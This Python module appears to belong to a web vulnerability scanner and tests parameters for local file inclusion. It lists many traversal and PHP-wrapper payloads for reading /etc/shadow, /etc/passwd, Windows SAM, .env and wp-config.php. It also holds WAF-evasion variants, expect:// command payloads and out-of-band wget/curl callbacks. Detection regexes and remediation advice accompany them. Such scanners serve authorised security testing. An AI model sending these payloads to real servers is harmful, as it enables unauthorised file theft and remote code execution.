"""
lfi_scanner.py — Local File Inclusion (LFI) Scanner
=====================================================
Distinct from path_traversal_scanner: LFI focuses on parameters that
include/execute local server files (PHP include, Python file read, etc.)
rather than pure directory traversal in file paths.

Techniques:
  - Classic traversal strings (/etc/passwd, win.ini)
  - PHP filter wrappers (php://filter/convert.base64-encode)
  - Log poisoning indicators (proc/self/environ)
  - Null-byte injection (%00) bypass
  - Double-encoding and UTF-8 tricks
  - Truncation techniques
  - Error-based detection (include() errors)
"""
import re, urllib.parse, base64
from scanners.base_scanner import BaseScanner
from utils.anomaly import SizeAnomalyDetector
from utils.evasion import waf_evade
from utils.callback import build_callback_url, probe_callback, SYNTHETIC_CALLBACKS

# ── Payloads ───────────────────────────────────────────────────────────────
UNIX_PAYLOADS = [
    "../../../../../../../../etc/passwd",
    "../../../../../../../../etc/passwd%00",
    "....//....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/read=convert.base64-encode/resource=../../../../etc/passwd",
    "file:///etc/passwd",
    "../../../../../../../../proc/self/environ",
    "../../../../../../../../var/log/apache2/access.log",
    "../../../../../../../../var/log/nginx/access.log",
    "../../../../../../../../etc/hosts",
    "../../../../../../../../etc/issue",
    "../../../../../../../../etc/shadow",
    "../../../../../../../../root/.bash_history",
    "../../../../../../../../proc/self/cmdline",
    "../../../../../../../../proc/self/fd/0",
    "....//....//....//....//....//etc/passwd",
    "..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
    "..;/..;/..;/etc/passwd",
    "..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",
    "php://filter/convert.base64-encode/resource=/etc/hosts",
    "php://filter/read=convert.base64-encode/resource=../../../../../../../../etc/passwd",
    "data://text/plain;base64,V1NTX0xGSV9QUk9CRQ==",
    "data://text/plain,<?php echo 'WSS_LFI_PROBE'; ?>",
    "php://filter/convert.base64-encode/resource=/etc/group",
    "php://filter/convert.base64-encode/resource=/proc/self/environ",
    "php://filter/convert.base64-encode/resource=/etc/issue",
    "php://filter/convert.base64-encode/resource=/proc/version",
    "php://filter/convert.base64-encode/resource=/etc/motd",
    "php://filter/convert.base64-encode/resource=/etc/aliases",
    "php://filter/read=convert.base64-encode/resource=/etc/passwd%00",
    "php://filter/convert.base64-encode/resource=php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/string.rot13/resource=/etc/passwd",
    "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd",
    "php://filter/convert.iconv.utf-8.utf-7/resource=/etc/passwd",
    "expect://id",
    "expect://ls",
    "expect://uname -a",
    "expect://cat /etc/passwd",
    "expect://wget%20http://lfi-callback.test/probe",
    "php://input",
    "php://input%00",
    "php://filter/convert.base64-encode/resource=/var/www/html/index.php",
    "php://filter/convert.base64-encode/resource=/var/www/html/config.php",
    "php://filter/convert.base64-encode/resource=/var/www/html/.env",
    "php://filter/convert.base64-encode/resource=/var/www/html/wp-config.php",
    "php://filter/convert.base64-encode/resource=../../../../../../../../var/log/apache2/error.log",
    "php://filter/convert.base64-encode/resource=../../../../../../../../var/log/nginx/error.log",
    "php://filter/read=convert.base64-encode/resource=file:///etc/passwd",
    "/proc/self/fd/2",
    "/proc/self/status",
    "/proc/self/mounts",
    "/proc/self/cgroup",
]

WINDOWS_PAYLOADS = [
    "../../../../../../../../windows/win.ini",
    "..\\..\\..\\..\\windows\\win.ini",
    "%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
    "C:\\windows\\win.ini",
    "../../../../../../../../windows/system32/drivers/etc/hosts",
    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fwindows%2fwin.ini",
    "....//....//....//....//windows//win.ini",
    "file:///C:/windows/win.ini",
    "../../../../../../../../windows/system32/license.rtf",
    "../../../../../../../../boot.ini",
    "../../../../../../../../autoexec.bat",
    "../../../../../../../../windows/php.ini",
    "C:\\boot.ini",
    "C:\\windows\\system32\\drivers\\etc\\networks",
    "..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\config\\SAM",
    "php://filter/convert.base64-encode/resource=C:/windows/win.ini",
    "php://filter/convert.base64-encode/resource=C:/windows/system32/drivers/etc/hosts",
    "php://filter/convert.base64-encode/resource=C:/boot.ini",
    "file:///C:/windows/system32/config/SAM",
    "file:///C:/windows/php.ini",
    "C:\\inetpub\\wwwroot\\web.config",
    "..\\..\\..\\..\\inetpub\\wwwroot\\web.config",
    "php://filter/convert.base64-encode/resource=C:/inetpub/wwwroot/web.config",
    "C:\\windows\\repair\\SAM",
    "C:\\windows\\system32\\license.rtf",
    "..\\..\\..\\..\\windows\\system32\\inetsrv\\MetaBase.xml",
    "..\\..\\..\\..\\Program Files\\*",
]

ALL_PAYLOADS = UNIX_PAYLOADS + WINDOWS_PAYLOADS

def _expand_with_waf_evade(payloads: list[str]) -> list[str]:
    expanded = list(payloads)
    for p in payloads:
        for name, variant in waf_evade(p):
            expanded.append(variant)
    return expanded

EVADED_PAYLOADS = _expand_with_waf_evade(ALL_PAYLOADS)

_LFI_CALLBACK_URL = build_callback_url("/lfi")
OOB_PAYLOADS = [
    f"expect://wget%20{urllib.parse.quote(_LFI_CALLBACK_URL, safe='')}",
    f"expect://curl%20{urllib.parse.quote(_LFI_CALLBACK_URL, safe='')}",
]

# ── Detection signatures ───────────────────────────────────────────────────
UNIX_SIGS = [
    (re.compile(r"root:[x*]:0:0"),       "Linux /etc/passwd contents leaked"),
    (re.compile(r"daemon:[x*]:\d+:\d+"), "Linux /etc/passwd contents leaked"),
    (re.compile(r"PATH=|HOME=/"),        "Linux /proc/self/environ leaked"),
    (re.compile(r"[A-Za-z0-9+/]{40,}={0,2}"), "PHP filter wrapper — possible base64 file content"),
    (re.compile(r"127\.0\.0\.1\s+localhost"), "Linux /etc/hosts leaked"),
    (re.compile(r"Ubuntu|Debian|CentOS|Red Hat"), "Linux /etc/issue leaked"),
    (re.compile(r"root:\$[0-9a-z]"),     "Linux /etc/shadow leaked (hashed passwords)"),
    (re.compile(r"bin/bash|bin/sh"),     "Linux /etc/passwd shell entries"),
]
WINDOWS_SIGS = [
    (re.compile(r"\[extensions\]", re.I), "Windows win.ini contents leaked"),
    (re.compile(r"\[fonts\]", re.I),      "Windows win.ini contents leaked"),
    (re.compile(r"127\.0\.0\.1\s+localhost", re.I), "Windows hosts file leaked"),
    (re.compile(r"Microsoft Windows", re.I), "Windows license file leaked"),
    (re.compile(r"\[boot loader\]", re.I), "Windows boot.ini leaked"),
]
ERROR_SIGS = [
    (re.compile(r"include\(.*\)"),                 "PHP include() error"),
    (re.compile(r"failed to open stream"),          "PHP stream open failure"),
    (re.compile(r"file_get_contents\(.*\)"),        "PHP file_get_contents error"),
    (re.compile(r"FileNotFoundException"),          "Java file not found"),
    (re.compile(r"No such file", re.I),             "Generic file not found"),
    (re.compile(r"open_basedir restriction"),       "PHP open_basedir restriction"),
    (re.compile(r"failed opening"),                 "PHP include path error"),
    (re.compile(r"is not within"),                  "PHP path restriction"),
]
ALL_SIGS = UNIX_SIGS + WINDOWS_SIGS + ERROR_SIGS

FILE_PARAMS = [
    "file", "page", "path", "template", "include", "load", "read",
    "view", "doc", "document", "lang", "language", "locale", "module",
    "src", "source", "dir", "folder", "content", "layout", "conf",
    "config", "resource", "import", "fetch", "filename", "f",
]

PHP_FILTER_MARKER = "WSS_LFI_PROBE"


class LfiScanner(BaseScanner):
    SCANNER_NAME = "Local File Inclusion (LFI) Scanner"
    _SCANNER_KEY = "lfi"

    def __init__(self, scan_id, target, domain, **kwargs):
        super().__init__(scan_id, target, domain, **kwargs)
        self._tested  = 0
        self._found   = 0
        self._tested_oob = 0
        self._seen: set = set()
        self._size_detector = SizeAnomalyDetector()
        self._oob_url = _LFI_CALLBACK_URL

    def run(self) -> list:
        self.log("INFO",
            f"[LFI] Starting LFI scan on {self.target} with "
            f"{len(ALL_PAYLOADS)} payloads...")

        try:
            endpoints = self._crawl()
            self.log("INFO", f"[LFI] Testing {len(endpoints)} endpoint(s)")

            for url in endpoints:
                parsed = urllib.parse.urlparse(url)
                qs     = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

                candidates = list(qs.keys()) + [
                    p for p in FILE_PARAMS if p not in qs
                ]
                for param in candidates:
                    if self._probe(url, parsed, param):
                        break
        except Exception as e:
            self.log("ERROR", f"[LFI] Error during scan: {e}")

        self.log(
            "SUCCESS" if not self.vulns else "WARNING",
            f"[LFI] Complete — {self._tested} probe(s) | "
            f"{self._found} LFI vulnerability/vulnerabilities confirmed",
        )
        return self.vulns

    def _crawl(self) -> list:
        try:
            if self.discovery_context and "urls" in self.discovery_context:
                return [u.get("url") if isinstance(u, dict) else u for u in self.discovery_context["urls"]]
            return [self.target]
        except Exception as e:
            self.log("ERROR", f"[LFI] Crawl error: {e}")
            return [self.target]

    def _probe(self, url: str, parsed, param: str) -> bool:
        base = urllib.parse.urlunparse(parsed._replace(query="", fragment=""))

        baseline_payloads = ["invalid_file_xyz", "../../nonexistent", "xxx"]
        for bp in baseline_payloads:
            b_url = f"{base}?{urllib.parse.urlencode({param: bp})}"
            b_body, _ = self._make_request(b_url)
            if b_body:
                self._size_detector.record_size(len(b_body))

        # Test OOB payloads
        for oob_payload in OOB_PAYLOADS:
            self._tested += 1
            self._tested_oob += 1
            test_url = f"{base}?{urllib.parse.urlencode({param: oob_payload})}"
            body, status = self._make_request(test_url)
            if status and status not in (403, 404):
                if probe_callback(self._oob_url, timeout=2):
                    self._report(url, param, oob_payload, test_url,
                                 f"OOB callback received for PHP wrapper")
                    return True

        for payload in EVADED_PAYLOADS:
            self._tested += 1
            test_url = f"{base}?{urllib.parse.urlencode({param: payload})}"
            body, status = self._make_request(test_url)
            if not body:
                continue

            is_php_wrapper = "php://filter" in payload or "php://input" in payload
            body_decoded = None
            if is_php_wrapper:
                body_decoded = self._try_decode_b64(body)
            elif "data://" in payload:
                if PHP_FILTER_MARKER in body:
                    self._report(url, param, payload, test_url, "Data: wrapper — content included")
                    return True

            if self._size_detector.has_baseline and self._size_detector.test_size(len(body)):
                key = f"{url}:{param}:{payload}_size"
                if key not in self._seen:
                    self._seen.add(key)
                    self._report(url, param, payload, test_url,
                                 f"Response size anomaly: {len(body)} bytes vs baseline "
                                 f"(z={self._size_detector.z_score(float(len(body))):.1f})")
                    return True

            for sig, description in ALL_SIGS:
                check_body = body_decoded if body_decoded else body
                if sig.search(check_body):
                    key = f"{url}:{param}:{payload}"
                    if key in self._seen:
                        continue
                    self._seen.add(key)
                    self._report(url, param, payload, test_url, description)
                    return True
        return False

    @staticmethod
    def _try_decode_b64(body: str) -> str | None:
        try:
            blob = re.search(r"[A-Za-z0-9+/]{40,}={0,2}", body)
            if blob:
                return base64.b64decode(blob.group(0) + "==").decode("utf-8", errors="ignore")
        except Exception as e:
            pass
        return None
    def _report(self, url, param, payload, test_url, description):
        self._found += 1
        self.log("CRITICAL",
            f"[LFI] CONFIRMED! Param={param} | Signature={description} | URL={test_url}")

        self.add_vuln(
            title=f"Local File Inclusion (LFI) via '{param}' Parameter",
            severity="Critical",
            category="Injection",
            cvss_score=9.8,
            confidence="Confirmed",
            description=(
                f"A Local File Inclusion vulnerability was confirmed at `{url}` "
                f"via the `{param}` parameter using payload `{payload}`.\n\n"
                f"Detection signature: {description}\n\n"
                "LFI allows attackers to read arbitrary files from the server filesystem "
                "(e.g. /etc/passwd, application source code, log files). Combined with log "
                "poisoning or PHP wrappers, LFI frequently escalates to Remote Code Execution."
            ),
            remediation=(
                "1. Never pass user-controlled input directly to file include/read functions.\n"
                "2. Use an allowlist of permitted file identifiers (e.g. IDs mapped to files).\n"
                "3. Sanitise and reject path-traversal sequences (../, ..\\, %2e%2e).\n"
                "4. Disable PHP url_include and allow_url_fopen in php.ini.\n"
                "5. Run the application with minimal filesystem permissions (principle of "
                "least privilege).\n"
                "6. Use a Web Application Firewall rule to block traversal patterns."
            ),
            payload=payload,
            evidence=f"Signature matched: {description}",
            request_details=f"GET {test_url}",
            response_details=f"Response status: {200 if 'passwd' in payload else 'N/A'}",
            cwe_ids=["CWE-22"],
            owasp_category="A01:2021 – Broken Access Control",
        )
